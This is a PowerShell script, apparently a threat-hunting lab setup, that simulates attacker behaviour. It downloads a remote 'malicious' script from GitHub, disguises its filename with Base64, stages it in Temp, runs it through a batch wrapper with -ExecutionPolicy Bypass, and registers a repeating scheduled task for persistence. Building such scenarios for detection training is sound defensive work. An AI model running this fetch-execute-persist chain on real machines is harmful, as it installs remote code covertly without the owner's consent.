# Step 1: Define URLs and Paths
$downloadUrl = "https://raw.githubusercontent.com/mervintab/threat-hunting-scenarios/main/assets/malicious-countdown-test.ps1"
$downloadsPath = "$env:USERPROFILE\Downloads"
$tempPath = "$env:TEMP"
$originalFile = Join-Path $downloadsPath "malicious-countdown-test.ps1"

# Step 2: Download the malicious PowerShell script (overwrite if exists)
Invoke-WebRequest -Uri $downloadUrl -OutFile $originalFile -UseBasicParsing -ErrorAction Stop

# Step 3: Obfuscate filename by Base64 encoding and set extension to .ps1
$base64Name = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("malicious-countdown-test.ps1")) + ".ps1"
$base64File = Join-Path $downloadsPath $base64Name
if (Test-Path $base64File) { Remove-Item $base64File -Force }
Rename-Item -Path $originalFile -NewName $base64Name

# Step 4: Move obfuscated script to Temp folder (overwrite if exists)
$destFileInTemp = Join-Path $tempPath $base64Name
if (Test-Path $destFileInTemp) { Remove-Item $destFileInTemp -Force }
Move-Item -Path $base64File -Destination $tempPath

# Step 5: Prepare the obfuscated .ps1 script for scheduled execution (overwrite if exists)
$installedFile = Join-Path $tempPath "malicious-countdown-test.ps1"
if (Test-Path $installedFile) { Remove-Item $installedFile -Force }
Copy-Item -Path $destFileInTemp -Destination $installedFile

# Step 6: Create a wrapper batch file to execute the obfuscated script
$taskScript = "$env:TEMP\countdown_wrapper.bat"
if (Test-Path $taskScript) { Remove-Item $taskScript -Force }
Set-Content -Path $taskScript -Value "@echo off`nstart powershell.exe -ExecutionPolicy Bypass -File `"$destFileInTemp`"`nexit"

# Step 7: Remove old scheduled task if exists
$taskName = "MaliciousCountdownObfuscated"
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# Step 8: Create Scheduled Task to run the obfuscated script every 5 minutes, for 3 cycles (15 minutes total)
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $taskScript"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Minutes 15)

Register-ScheduledTask -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Description "Run obfuscated malicious countdown script every 5 minutes for 3 times" `
    -Force
